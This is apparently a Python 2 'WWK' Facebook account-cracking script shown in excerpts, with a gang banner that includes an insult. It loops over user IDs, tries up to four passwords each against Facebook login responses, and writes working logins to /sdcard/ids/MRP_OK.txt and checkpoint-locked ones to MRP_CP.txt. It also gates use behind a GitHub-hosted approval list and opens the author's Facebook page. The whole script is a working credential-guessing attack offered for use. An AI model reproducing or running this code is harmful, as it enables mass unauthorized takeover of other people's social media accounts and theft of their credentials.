...
\033[1;92m                     🄱🅁🄰🄽🄳        
\033[1;97m **********************************
\033[1;93m  SCRIPT MAKER  :  ALEY KASHAN
\033[1;96m  GANG OWNER    :  HAMZU ALEY MURSHAD
\033[1;95m  NOTE          :  HATTERS FUCK YOU
\033[1;94m  THE MASTER MINDS WWK KINGS 
\033[1;97m  *********************************
"""
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/aley786/WWK/main/wwk.txt').text
    if to in r:
        ...
        os.system('xdg-open https://www.facebook.com/kalookhan.hassni.2021 ' )
        reg()
...
def menu():
    ...
    print '\033[1;92m[2] Follow WWK OWNER'
...
def a_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\033[1;95mITz WWK BRAND \033[1;94m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;92m[WWK-OK]➤ ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/MRP_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;97m[WWK-CP]➤ ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[WWK-OK]➤ ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/MRP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;97m[WWK-CP]➤ ' + uid + ' | ' + pass2
                    cp = open('MRP_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;92m[WWK-OK]➤ ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/MRP_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;97m[WWK-CP]➤ ' + uid + ' | ' + pass3
                        cp = open('MRP_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;92m[WWK-OK]➤ ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/MRP_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;97m[WWK-CP]➤ ' + uid + ' | ' + pass4
                            cp = open('MRP_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
    ...
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92mWWK BranD  PROGRAMMING'
